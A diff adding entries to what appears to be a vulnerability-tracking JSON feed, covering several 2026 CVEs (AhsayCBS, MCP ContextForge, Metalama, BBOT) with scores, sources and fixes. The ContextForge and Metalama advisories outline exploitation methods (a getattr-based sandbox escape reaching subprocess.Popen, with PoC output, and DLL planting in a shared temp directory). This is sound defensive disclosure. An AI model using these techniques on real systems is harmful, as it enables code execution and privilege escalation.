+      "canonical_id": "CVE-2026-105133",
+      "category": "vulnerability",
+      "cisa_due_date": "2026-10-17T00:00:00+00:00",
+      "cisa_kev": true,
+      "cisa_required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+      "collected_at": "2026-10-15T14:36:32.740122+00:00",
+      "community_comments": null,
+      "community_score": null,
+      "confidence": "high",
+      "critical_asset_exposure": null,
+      "current_state": {
+        "cisa_due_date": "2026-10-17T00:00:00+00:00",
+        "cisa_kev": true,
+        "cisa_required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+        "critical_asset_exposure": null,
+        "cvss_score": 5.5,
+        "exploitation_status": "confirmed_exploitation",
+        "fixed_versions": [],
+        "known_exploited": true,
+        "known_ransomware_use": null,
+        "public_exploit": null,
+        "severity": "medium",
+        "vendor_confirmed_exploitation": null,
+        "withdrawn": false
+      },
+      "cve_ids": [
+        "CVE-2026-105133"
+      ],
+      "cvss_score": 5.5,
+      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+      "cvss_version": "4.0",
+      "detection_opportunities": [
+        "Inventory affected products, verify exposure and follow the vendor remediation or mitigation guidance."
+      ],
+      "discovery_type": "state_transition",
+      "discussion_url": null,
+      "ecosystems": [],
+      "epss_percentile": 0.50776,
+      "epss_score": 0.00666,
+      "excerpt_origin": null,
+      "exploitation_status": "confirmed_exploitation",
+      "first_seen": "2026-10-04T10:06:20+00:00",
+      "fixed_versions": [],
+      "ghsa_ids": [],
+      "kev_date_added": "2026-10-14T00:00:00+00:00",
+      "known_exploited": true,
+      "known_ransomware_use": null,
+      "last_seen": "2026-10-15T14:41:13+00:00",
+      "modified_at": "2026-10-14T00:00:00+00:00",
+      "official_source": true,
+      "previous_state": {
+        "cisa_due_date": null,
+        "cisa_kev": null,
+        "cisa_required_action": null,
+        "critical_asset_exposure": null,
+        "cvss_score": 5.5,
+        "exploitation_status": "unknown",
+        "fixed_versions": [],
+        "known_exploited": null,
+        "known_ransomware_use": null,
+        "public_exploit": null,
+        "severity": "medium",
+        "vendor_confirmed_exploitation": null,
+        "withdrawn": false
+      },
+      "priority_after": 9.6,
+      "priority_before": 4.8,
+      "priority_level": "HIGH",
+      "priority_level_before": "NORMAL",
+      "priority_reasons": [
+        "CVSS 5.5",
+        "detection opportunity",
+        "CISA KEV"
+      ],
+      "priority_score": 9.6,
+      "products": [
+        "AhsayCBS"
+      ],
+      "provenance": {
+        "cvss_score": [
+          {
+            "collected_at": "2026-10-15T14:41:14.029901+00:00",
+            "field": "cvss_score",
+            "source_name": "NVD CVE API 2.0",
+            "value": 5.5
+          }
+        ],
+        "cvss_vector": [
+          {
+            "collected_at": "2026-10-15T14:41:14.029902+00:00",
+            "field": "cvss_vector",
+            "source_name": "NVD CVE API 2.0",
+            "value": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X"
+          }
+        ],
+        "cvss_version": [
+          {
+            "collected_at": "2026-10-15T14:41:14.029902+00:00",
+            "field": "cvss_version",
+            "source_name": "NVD CVE API 2.0",
+            "value": "4.0"
+          }
+        ],
+        "epss_percentile": [
+          {
+            "collected_at": "2026-10-15T14:41:14.029901+00:00",
+            "field": "epss_percentile",
+            "source_name": "NVD CVE API 2.0",
+            "value": 0.30147
+          }
+        ],
+        "epss_score": [
+          {
+            "collected_at": "2026-10-15T14:41:14.029899+00:00",
+            "field": "epss_score",
+            "source_name": "NVD CVE API 2.0",
+            "value": 0.00383
+          }
+        ],
+        "severity": [
+          {
+            "collected_at": "2026-10-15T14:41:14.029903+00:00",
+            "field": "severity",
+            "source_name": "NVD CVE API 2.0",
+            "value": "MEDIUM"
+          }
+        ]
+      },
+      "public_exploit": null,
+      "published_at": "2026-10-04T07:16:33.087000+00:00",
+      "recommended_actions": [
+        "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines."
+      ],
+      "references": [
+        "https://vuldb.com/cve/CVE-2026-105133",
+        "https://vuldb.com/submit/942688",
+        "https://vuldb.com/vuln/413350",
+        "https://vuldb.com/vuln/413350/cti",
+        "https://www.ahsay.com/en/company/announcements/patch-cve-105133-105134-update ; ; BOD 26-04: https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk ; Forensics Triage Requirements: https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk ; https://nvd.nist.gov/vuln/detail/CVE-2026-105133",
+        "https://www.ahsay.com/en/support/help-centre/release-notes/cbs/v10.3.4"
+      ],
+      "selection_reasons": [
+        "CISA KEV +50",
+        "confirmed exploitation +40",
+        "official source +5"
+      ],
+      "selection_score": 95,
+      "severity": "MEDIUM",
+      "source_name": "CISA Known Exploited Vulnerabilities",
+      "source_tier": 1,
+      "source_type": "government_kev",
+      "source_url": "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json",
+      "state_changed_at": "2026-10-15T14:41:13+00:00",
+      "state_transitions": [
+        {
+          "basis": "collector observation",
+          "changed_at": "2026-10-15T14:41:13+00:00",
+          "current_state": {
+            "cisa_due_date": "2026-10-17T00:00:00+00:00",
+            "cisa_kev": true,
+            "cisa_required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+            "critical_asset_exposure": null,
+            "cvss_score": 5.5,
+            "exploitation_status": "confirmed_exploitation",
+            "fixed_versions": [],
+            "known_exploited": true,
+            "known_ransomware_use": null,
+            "public_exploit": null,
+            "severity": "medium",
+            "vendor_confirmed_exploitation": null,
+            "withdrawn": false
+          },
+          "event_id": "bd55bf5d8f65896fb771c781",
+          "previous_state": {
+            "cisa_due_date": null,
+            "cisa_kev": null,
+            "cisa_required_action": null,
+            "critical_asset_exposure": null,
+            "cvss_score": 5.5,
+            "exploitation_status": "unknown",
+            "fixed_versions": [],
+            "known_exploited": null,
+            "known_ransomware_use": null,
+            "public_exploit": null,
+            "severity": "medium",
+            "vendor_confirmed_exploitation": null,
+            "withdrawn": false
+          },
+          "priority_after": 9.6,
+          "priority_before": 4.8,
+          "priority_level_after": "HIGH",
+          "priority_level_before": "NORMAL",
+          "sources": [
+            {
+              "modified_at": "2026-10-14T00:00:00+00:00",
+              "name": "CISA Known Exploited Vulnerabilities",
+              "url": "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
+            }
+          ],
+          "transition_type": [
+            "entered_cisa_kev",
+            "exploitation_confirmed",
+            "exploitation_status_confirmed",
+            "cisa_due_date_changed",
+            "required_action_changed"
+          ]
+        }
+      ],
+      "summary": "Ahsay AhsayCBS contains an improper authentication vulnerability that could allow a remote attacker to bypass authentication via manipulation of the random parameter in the API component\u2019s checkSysPwd function. This vulnerability can be chained with CVE-2026-105134.",
+      "title": "CVE-2026-105133 exploited in CISA KEV: Ahsay AhsayCBS",
+      "transition_type": [
+        "entered_cisa_kev",
+        "exploitation_confirmed",
+        "exploitation_status_confirmed",
+        "cisa_due_date_changed",
+        "required_action_changed"
+      ],
+      "vendor_confirmed_exploitation": null,
+      "vendors": [
+        "Ahsay"
+      ],
+      "weaknesses": [],
+      "withdrawn": false
+    },
+    {
+      "affected_versions": [
+        "<= 1.0.1"
+      ],
+      "author": null,
+      "blue_team_relevance": "",
+      "canonical_id": "CVE-2026-53710",
+      "category": "vulnerability",
+      "cisa_due_date": null,
+      "cisa_kev": null,
+      "cisa_required_action": null,
+      "collected_at": "2026-10-01T10:04:39.309357+00:00",
+      "community_comments": null,
+      "community_score": null,
+      "confidence": "medium",
+      "critical_asset_exposure": null,
+      "current_state": {
+        "cisa_due_date": null,
+        "cisa_kev": null,
+        "cisa_required_action": null,
+        "critical_asset_exposure": null,
+        "cvss_score": 10.0,
+        "exploitation_status": "unknown",
+        "fixed_versions": [
+          "1.0.2"
+        ],
+        "known_exploited": null,
+        "known_ransomware_use": null,
+        "public_exploit": null,
+        "severity": "critical",
+        "vendor_confirmed_exploitation": null,
+        "withdrawn": false
+      },
+      "cve_ids": [
+        "CVE-2026-53710"
+      ],
+      "cvss_score": 10.0,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+      "cvss_version": "3.1",
+      "detection_opportunities": [
+        "Inventory affected products, verify exposure and follow the vendor remediation or mitigation guidance."
+      ],
+      "discovery_type": "state_transition",
+      "discussion_url": null,
+      "ecosystems": [
+        "pip"
+      ],
+      "epss_percentile": 0.65366,
+      "epss_score": 0.01141,
+      "excerpt_origin": null,
+      "exploitation_status": null,
+      "first_seen": "2026-09-16T14:31:48+00:00",
+      "fixed_versions": [
+        "1.0.2"
+      ],
+      "ghsa_ids": [
+        "GHSA-xm98-3vcf-fph7"
+      ],
+      "kev_date_added": null,
+      "known_exploited": null,
+      "known_ransomware_use": null,
+      "last_seen": "2026-10-15T14:41:13+00:00",
+      "modified_at": "2026-10-15T01:07:05+00:00",
+      "official_source": true,
+      "previous_state": {
+        "cisa_due_date": null,
+        "cisa_kev": null,
+        "cisa_required_action": null,
+        "critical_asset_exposure": null,
+        "cvss_score": 10.0,
+        "exploitation_status": "unknown",
+        "fixed_versions": [],
+        "known_exploited": null,
+        "known_ransomware_use": null,
+        "public_exploit": null,
+        "severity": "critical",
+        "vendor_confirmed_exploitation": null,
+        "withdrawn": false
+      },
+      "priority_after": 9.4,
+      "priority_before": 9.2,
+      "priority_level": "HIGH",
+      "priority_level_before": "HIGH",
+      "priority_reasons": [
+        "CVSS 10.0",
+        "detection opportunity"
+      ],
+      "priority_score": 9.4,
+      "products": [
+        "mcp-contextforge-gateway"
+      ],
+      "provenance": {
+        "cvss_score": [
+          {
+            "collected_at": "2026-10-15T14:41:14.054455+00:00",
+            "field": "cvss_score",
+            "source_name": "GitHub Global Security Advisories",
+            "value": 0.0
+          }
+        ],
+        "epss_percentile": [
+          {
+            "collected_at": "2026-10-15T14:41:14.054455+00:00",
+            "field": "epss_percentile",
+            "source_name": "GitHub Global Security Advisories",
+            "value": 0.66055
+          },
+          {
+            "collected_at": "2026-10-15T14:41:14.054504+00:00",
+            "field": "epss_percentile",
+            "source_name": "Retained report",
+            "value": 0.55675
+          }
+        ],
+        "epss_score": [
+          {
+            "collected_at": "2026-10-15T14:41:14.054503+00:00",
+            "field": "epss_score",
+            "source_name": "Retained report",
+            "value": 0.00827
+          }
+        ],
+        "severity": [
+          {
+            "collected_at": "2026-10-15T14:41:14.054456+00:00",
+            "field": "severity",
+            "source_name": "GitHub Global Security Advisories",
+            "value": "critical"
+          }
+        ]
+      },
+      "public_exploit": null,
+      "published_at": "2026-08-24T19:20:58+00:00",
+      "recommended_actions": [],
+      "references": [
+        "https://github.com/IBM/mcp-context-forge/commit/63a2900e6301b9c8a483a38d3737a1beb3a7ce89",
+        "https://github.com/IBM/mcp-context-forge/releases#release-v1.0.2",
+        "https://github.com/IBM/mcp-context-forge/releases/tag/v1.0.2",
+        "https://github.com/IBM/mcp-context-forge/security/advisories/GHSA-xm98-3vcf-fph7",
+        "https://github.com/advisories/GHSA-xm98-3vcf-fph7"
+      ],
+      "selection_reasons": [
+        "critical CVSS +20",
+        "official source +5",
+        "defensive detection opportunity +5",
+        "modified metadata in window -5"
+      ],
+      "selection_score": 25,
+      "severity": "CRITICAL",
+      "source_name": "NVD CVE API 2.0",
+      "source_tier": 1,
+      "source_type": "vulnerability_database",
+      "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2026-53710",
+      "state_changed_at": "2026-10-15T14:41:13+00:00",
+      "state_transitions": [
+        {
+          "basis": "collector observation",
+          "changed_at": "2026-10-15T14:41:13+00:00",
+          "current_state": {
+            "cisa_due_date": null,
+            "cisa_kev": null,
+            "cisa_required_action": null,
+            "critical_asset_exposure": null,
+            "cvss_score": 10.0,
+            "exploitation_status": "unknown",
+            "fixed_versions": [
+              "1.0.2"
+            ],
+            "known_exploited": null,
+            "known_ransomware_use": null,
+            "public_exploit": null,
+            "severity": "critical",
+            "vendor_confirmed_exploitation": null,
+            "withdrawn": false
+          },
+          "event_id": "a27e8853320ec9bfd5e13d18",
+          "previous_state": {
+            "cisa_due_date": null,
+            "cisa_kev": null,
+            "cisa_required_action": null,
+            "critical_asset_exposure": null,
+            "cvss_score": 10.0,
+            "exploitation_status": "unknown",
+            "fixed_versions": [],
+            "known_exploited": null,
+            "known_ransomware_use": null,
+            "public_exploit": null,
+            "severity": "critical",
+            "vendor_confirmed_exploitation": null,
+            "withdrawn": false
+          },
+          "priority_after": 9.4,
+          "priority_before": 9.2,
+          "priority_level_after": "HIGH",
+          "priority_level_before": "HIGH",
+          "sources": [
+            {
+              "modified_at": "2026-10-15T01:07:05+00:00",
+              "name": "GitHub Global Security Advisories",
+              "url": "https://github.com/advisories/GHSA-xm98-3vcf-fph7"
+            }
+          ],
+          "transition_type": [
+            "vendor_remediation_updated"
+          ]
+        }
+      ],
+      "summary": "**Commit:** `f855e54d5b7bc1c91b977574a03b91eff6b86bb6`\n**Component:** `mcp-servers/python/python_sandbox_server/src/python_sandbox_server/server_fastmcp.py`\n\n## Vulnerability\n\nRestrictedPython's sandbox in ContextForge's `python_sandbox_server` sub-project allows arbitrary Python execution via three compounding weaknesses:\n\n1. Raw `getattr` is exposed in `safe_builtins`, bypassing `_getattr_` mediation.\n2. `validate_code` checks for literal dangerous dunder strings, but the payload constructs those names at runtime.\n3. The `execute_code` MCP tool can be exposed over HTTP/SSE transport with no authentication layer.\n\n## Proof of Concept\n\nThe local PoC was executed against the real pinned sandbox code path. It constructs dunder names at runtime, walks Python's class hierarchy through the exposed `getattr`, finds `subprocess.Popen`, and executes a harmless marker command.\n\nTranscript excerpt:\n\n```text\nPOC: IBM/mcp-context-forge RestrictedPython getattr sandbox bypass\nvalidation={'valid': True, 'message': 'Code passed validation', 'warnings': None}\nsuccess=True\nstdout=\"FOUND_POPEN\\nb'IBM_SANDBOX_POC_PASS'\\n\"\nIBM_RESTRICTEDPYTHON_GETATTR_POPEN_REPRO_PASS\n```\n\nPoC artifact hashes:\n\n```text\nbeb2d856c5a1b7c10005c9c0fccaf3d491d4fbcc2a69bc54b5e95c5730c0874b  run.py\n1037dcb4f0831a3c96ca728527f939af1d3e19514b23ef54f663707875748ff8  run.sh\n7026e676ee31916886f10feed959ffdbe486fda05b17421387e4717acbf90ba6  transcript.txt\n```\n\n## Production Deployment Context\n\nContextForge's documentation describes registering MCP servers as gateways in a running ContextForge instance. If this sandbox server is reachable over HTTP in that pattern, any client that can reach the endpoint can submit the payload through `tools/call`.\n\n## Impact\n\nAn attacker with access to the `python_sandbox_server` HTTP endpoint can execute OS commands with the privileges of the server process. In containerized deployments with host mounts or internal network reachability, this can become filesystem compromise or network pivoting from the gateway host.\n\n## Suggested Fix\n\nRemove raw `getattr` and `setattr` from `safe_builtins`, expose only policy-controlled attribute access if dynamic lookup is required, replace substring filtering with a stricter RestrictedPython policy pipeline, and add authentication to HTTP transport for all `tools/call` requests.\n\n## Caveats\n\nThis report covers the `python_sandbox_server` sub-project. The core ContextForge gateway and proxy components are not directly affected. The Critical score assumes HTTP reachability; stdio-only deployments reduce the attack vector.",
+      "title": "CVE-2026-53710: MCP Context Forge is an AI gateway, registry, and proxy for MCP, A2A, REST, and gRPC APIs. Prior to 1.0.2, the python_sa",
+      "transition_type": [
+        "vendor_remediation_updated"
+      ],
+      "vendor_confirmed_exploitation": null,
+      "vendors": [],
+      "weaknesses": [],
+      "withdrawn": false
+    },
+    {
+      "affected_versions": [
+        ">= 2026.1.0-preview, < 2026.1.19",
+        ">= 2026.1.0-preview, < 2026.1.19",
+        "< 2025.1.18",
+        "< 2025.1.18",
+        ">= 2026.0.0-preview, < 2026.0.25",
+        ">= 2026.0.0-preview, < 2026.0.25"
+      ],
+      "author": null,
+      "blue_team_relevance": "",
+      "canonical_id": "CVE-2026-62847",
+      "category": "vulnerability",
+      "cisa_due_date": null,
+      "cisa_kev": null,
+      "cisa_required_action": null,
+      "collected_at": "2026-10-15T14:41:00.499887+00:00",
+      "community_comments": null,
+      "community_score": null,
+      "confidence": "high",
+      "critical_asset_exposure": null,
+      "current_state": {
+        "cisa_due_date": null,
+        "cisa_kev": null,
+        "cisa_required_action": null,
+        "critical_asset_exposure": null,
+        "cvss_score": 6.0,
+        "exploitation_status": "unknown",
+        "fixed_versions": [
+          "2025.1.18",
+          "2026.0.25",
+          "2026.1.19"
+        ],
+        "known_exploited": null,
+        "known_ransomware_use": null,
+        "public_exploit": null,
+        "severity": "medium",
+        "vendor_confirmed_exploitation": null,
+        "withdrawn": false
+      },
+      "cve_ids": [
+        "CVE-2026-62847"
+      ],
+      "cvss_score": 6.0,
+      "cvss_vector": "CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:P/VC:L/VI:H/VA:L/SC:L/SI:H/SA:H",
+      "cvss_version": "4.0",
+      "detection_opportunities": [
+        "Inventory affected products, verify exposure and follow the vendor remediation or mitigation guidance."
+      ],
+      "discovery_type": "new_vulnerability",
+      "discussion_url": null,
+      "ecosystems": [
+        "nuget",
+        "nuget",
+        "nuget",
+        "nuget",
+        "nuget",
+        "nuget"
+      ],
+      "epss_percentile": null,
+      "epss_score": null,
+      "excerpt_origin": null,
+      "exploitation_status": null,
+      "first_seen": "2026-10-15T14:41:13+00:00",
+      "fixed_versions": [
+        "2026.1.19",
+        "2026.1.19",
+        "2025.1.18",
+        "2025.1.18",
+        "2026.0.25",
+        "2026.0.25"
+      ],
+      "ghsa_ids": [
+        "GHSA-m6wq-39m7-9xpp"
+      ],
+      "kev_date_added": null,
+      "known_exploited": null,
+      "known_ransomware_use": null,
+      "last_seen": "2026-10-15T14:41:13+00:00",
+      "modified_at": "2026-10-14T19:24:55+00:00",
+      "official_source": true,
+      "previous_state": null,
+      "priority_after": null,
+      "priority_before": null,
+      "priority_level": "NORMAL",
+      "priority_level_before": null,
+      "priority_reasons": [
+        "CVSS 6.0",
+        "priority technology: windows",
+        "detection opportunity",
+        "metadata-only update"
+      ],
+      "priority_score": 5.8,
+      "products": [
+        "Metalama.Framework",
+        "Metalama.Tool",
+        "Metalama.Framework",
+        "Metalama.Tool",
+        "Metalama.Tool",
+        "Metalama.Framework"
+      ],
+      "provenance": {},
+      "public_exploit": null,
+      "published_at": "2026-10-14T19:24:53+00:00",
+      "recommended_actions": [],
+      "references": [
+        "https://github.com/metalama/Metalama/security/advisories/GHSA-m6wq-39m7-9xpp",
+        "https://github.com/metalama/Metalama/pull/1719",
+        "https://github.com/metalama/Metalama/commit/09911349a916e82194b1cfaa6d0a38acad928fc9",
+        "https://github.com/metalama/Metalama/commit/92c4feecfce86d18fcb007ab6d3a1b4383326a2e",
+        "https://github.com/metalama/Metalama/commit/ab9407263203c66d7c5680a34c28dba31f9951c9",
+        "https://github.com/advisories/GHSA-m6wq-39m7-9xpp"
+      ],
+      "selection_reasons": [
+        "priority technology: windows +8",
+        "official source +5",
+        "modified metadata in window -5"
+      ],
+      "selection_score": 8,
+      "severity": "medium",
+      "source_name": "GitHub Global Security Advisories",
+      "source_tier": 1,
+      "source_type": "reviewed_advisory",
+      "source_url": "https://github.com/advisories/GHSA-m6wq-39m7-9xpp",
+      "state_changed_at": null,
+      "state_transitions": [],
+      "summary": "## Summary\n\nMetalama loaded and executed compile-time assemblies, auxiliary executable tools, and embedded helper assemblies from predictable temporary directories. On Linux and macOS the default cache location was the world-writable system temporary directory (`Path.GetTempPath()`, i.e. `/tmp`), and previously-generated artifacts were trusted based on the presence of a sentinel/`.completed` marker file rather than on any integrity verification.\n\nA local, unprivileged user on a shared machine or CI/build agent can pre-create the deterministic cache directory structure and plant a malicious DLL together with the matching sentinel file. When a higher-privileged user (or build/service account) subsequently runs a build, Metalama finds the sentinel, skips regeneration, and loads and executes the attacker-supplied assembly inside the compiler / IDE / MSBuild process.\n\nAffected load-and-execute paths:\n- the cache of compile-time assemblies that Metalama generates from your aspects;\n- auxiliary executable tools that Metalama extracts to a local directory and then launches;\n- embedded .NET helper assemblies that Metalama extracts to a local directory and loads into the build / IDE process.\n\n## Impact\n\nArbitrary code execution in the security context of the building user \u2014 i.e. a local privilege escalation across user accounts on shared POSIX systems (multi-user developer machines, CI/build agents). The attacker obtains code execution as the victim without holding the victim's privileges, and can read source/secrets, tamper with build output (supply-chain injection), or disrupt builds.\n\n## Affected configurations\n\n- **Linux and macOS, default configuration \u2014 affected.** The shipped default uses the world-writable system temp directory.\n- **Windows, default configuration \u2014 not affected.** The default per-user temporary directory is protected by OS ACLs, so cross-user planting is not possible.\n- The `METALAMA_TEMP` environment variable is a deployer-controlled override and is **out of scope**: pointing it at an insecure (e.g. world-writable or attacker-owned) location is a deployment misconfiguration, not a defect in the product.\n\n## Severity\n\nCVSS v3.1: `AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H` = **8.2 (High)** for the affected POSIX default configuration (Scope:Changed reflects the cross-user privilege escalation).\n\nCVSS v4.0 cross-check: `CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:P/VC:L/VI:H/VA:L/SC:L/SI:H/SA:H` = 6.0 (Medium), which more granularly attributes low impact to the cache itself and high impact to the subsequent build process. The honest range is therefore Medium-High depending on the scoring model and platform.\n\n## Fix\n\nCaches and extraction directories were relocated from the world-writable system temp directory to per-user application-data locations (`$XDG_CACHE_HOME` / `~/.cache/Metalama` on POSIX), relying on OS-enforced per-user ownership as the trust boundary. Fixed in **2026.1.19**.\n\n## Weaknesses\n\n- CWE-377: Insecure Temporary File\n- CWE-427: Uncontrolled Search Path Element\n\n## Affected packages\n\n- Metalama.Framework < 2026.1.19, \n- Metalama.Tool < 2026.1.19\n\nInternal tracking: metalama/Metalama#1650.",
+      "title": "Metalama allows local code execution through DLL planting in shared temporary directories",
+      "transition_type": [],
+      "vendor_confirmed_exploitation": null,
+      "vendors": [],
+      "weaknesses": [],
+      "withdrawn": false
+    },
+    {
+      "affected_versions": [
+        ">= 2.3.1, < 3.0.0"
+      ],
+      "author": null,
+      "blue_team_relevance": "",
+      "canonical_id": "CVE-2026-14966",
+      "category": "vulnerability",
+      "cisa_due_date": null,
+      "cisa_kev": null,
+      "cisa_required_action": null,
+      "collected_at": "2026-10-15T14:41:00.499845+00:00",
+      "community_comments": null,
+      "community_score": null,
+      "confidence": "high",
+      "critical_asset_exposure": null,
+      "current_state": {
+        "cisa_due_date": null,
+        "cisa_kev": null,
+        "cisa_required_action": null,
+        "critical_asset_exposure": null,
+        "cvss_score": 0.0,
+        "exploitation_status": "unknown",
+        "fixed_versions": [
+          "3.0.0"
+        ],
+        "known_exploited": null,
+        "known_ransomware_use": null,
+        "public_exploit": null,
+        "severity": "low",
+        "vendor_confirmed_exploitation": null,
+        "withdrawn": false
+      },
+      "cve_ids": [
+        "CVE-2026-14966"
+      ],
+      "cvss_score": 0.0,
+      "cvss_vector": null,
+      "cvss_version": null,
+      "detection_opportunities": [
+        "Inventory affected products, verify exposure and follow the vendor remediation or mitigation guidance."
+      ],
+      "discovery_type": "new_vulnerability",
+      "discussion_url": null,
+      "ecosystems": [
+        "pip"
+      ],
+      "epss_percentile": 0.30768,
+      "epss_score": 0.00384,
+      "excerpt_origin": null,
+      "exploitation_status": null,
+      "first_seen": "2026-10-15T14:41:13+00:00",
+      "fixed_versions": [
+        "3.0.0"
+      ],
+      "ghsa_ids": [
+        "GHSA-xpf3-p7gm-7756"
+      ],
+      "kev_date_added": null,
+      "known_exploited": null,
+      "known_ransomware_use": null,
+      "last_seen": "2026-10-15T14:41:13+00:00",
+      "modified_at": "2026-10-14T19:34:31+00:00",
+      "official_source": true,
+      "previous_state": null,
+      "priority_after": null,
+      "priority_before": null,
+      "priority_level": "NORMAL",
+      "priority_level_before": null,
+      "priority_reasons": [
+        "CVSS 0.0",
+        "detection opportunity"
+      ],
+      "priority_score": 0.2,
+      "products": [
+        "bbot"
+      ],
+      "provenance": {},
+      "public_exploit": null,
+      "published_at": "2026-10-14T19:34:31+00:00",
+      "recommended_actions": [],
+      "references": [
+        "https://github.com/blacklanternsecurity/bbot/security/advisories/GHSA-xpf3-p7gm-7756",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-14966",
+        "https://github.com/blacklanternsecurity/bbot/commit/3bc8d3a96f34f312853c9fcf8decee2a4e905f26",
+        "https://github.com/blacklanternsecurity/bbot/commit/a3f1a2292e2b0a553827c6175b761abe28807735",
+        "https://github.com/pypa/advisory-database/tree/main/vulns/bbot/PYSEC-2026-3719.yaml",
+        "https://github.com/advisories/GHSA-xpf3-p7gm-7756"
+      ],
+      "selection_reasons": [
+        "official source +5"
+      ],
+      "selection_score": 5,
+      "severity": "low",
+      "source_name": "GitHub Global Security Advisories",
+      "source_tier": 1,
+      "source_type": "reviewed_advisory",
+      "source_url": "https://github.com/advisories/GHSA-xpf3-p7gm-7756",
+      "state_changed_at": null,
+      "state_transitions": [],
+      "summary": "BBOT's `unarchive` module rejects archives containing symlink entries before extraction, but for zip and 7z archives it failed to detect symlinks whose listing carries a DOS-attribute prefix before the unix mode, as produced by legacy versions of p7zip. Such an archive, downloaded and extracted during a scan (for example via `filedownload`), bypassed the guard and caused an attacker-controlled symlink to be written into the extraction directory. The effect is limited to planting the symlink (its target is not written through), and only hosts using such a legacy p7zip build are affected; current mainline 7-Zip is not.",
+      "title": "BBOT's Symlink guard bypass in unarchive module allows planting symlinks during extraction",
+      "transition_type": [],
+      "vendor_confirmed_exploitation": null,
+      "vendors": [],
+      "weaknesses": [],
+      "withdrawn": false
+    },
+    {
+      "affected_versions": [
+        "< 1.14.3",
+        ">= 2.0.0, < 2.7.33",
+        ">= 3.0.0, < 3.14.23",
+        ">= 4.0.0, < 4.7.12",
+        ">= 5.0.0, < 5.4.2"
+      ],
+      "author": null,
+      "blue_team_relevance": "",
+      "canonical_id": "CVE-2026-102695",
+      "category": "vulnerability",
+      "cisa_due_date": null,
+      "cisa_kev": null,
+      "cisa_required_action": null,
+      "collected_at": "2026-10-15T14:41:00.499910+00:00",
+      "community_comments": null,
+      "community_score": null,
+      "confidence": "high",
+      "critical_asset_exposure": null,
+      "current_state": {
+        "cisa_due_date": null,
+        "cisa_kev": null,
+        "cisa_required_action": null,
+        "critical_asset_exposure": null,
+        "cvss_score": 0.0,
+        "exploitation_status": "unknown",
+        "fixed_versions": [
+          "1.14.3",
+          "2.7.33",
+          "3.14.23",
+          "4.7.12",
+          "5.4.2"
+        ],
+        "known_exploited": null,
+        "known_ransomware_use": null,
+        "public_exploit": null,
+        "severity": "high",
+        "vendor_confirmed_exploitation": null,
+        "withdrawn": false
+      },
+      "cve_ids": [
+        "CVE-2026-102695"
+      ],
+      "cvss_score": 0.0,
+      "cvss_vector": null,
+      "cvss_version": null,
+      "detection_opportunities": [
+        "Inventory affected products, verify exposure and follow the vendor remediation or mitigation guidance."
+      ],
+      "discovery_type": "new_vulnerability",
+      "discussion_url": null,
+      "ecosystems": [
+        "maven",
+        "maven",
+        "maven",
+        "maven",
+        "maven"
+      ],
+      "epss_percentile": 0.21786,
+      "epss_score": 0.00306,
+      "excerpt_origin": null,
+      "exploitation_status": null,
+      "first_seen": "2026-10-15T14:41:13+00:00",
+      "fixed_versions": [
+        "1.14.3",
+        "2.7.33",
+        "3.14.23",
+        "4.7.12",
+        "5.4.2"
+      ],
+      "ghsa_ids": [
+        "GHSA-fp43-vj7g-pg92"
+      ],
+      "kev_date_added": null,
+      "known_exploited": null,
+      "known_ransomware_use": null,
+      "last_seen": "2026-10-15T14:41:13+00:00",
+      "modified_at": "2026-10-14T15:58:55+00:00",
+      "official_source": true,
+      "previous_state": null,
+      "priority_after": null,
+      "priority_before": null,
+      "priority_level": "NORMAL",
+      "priority_level_before": null,
+      "priority_reasons": [
+        "CVSS 0.0",
+        "priority technology: browsers",
+        "detection opportunity",
+        "metadata-only update"
+      ],
+      "priority_score": 0.0,
+      "products": [
+        "org.omnifaces:omnifaces",
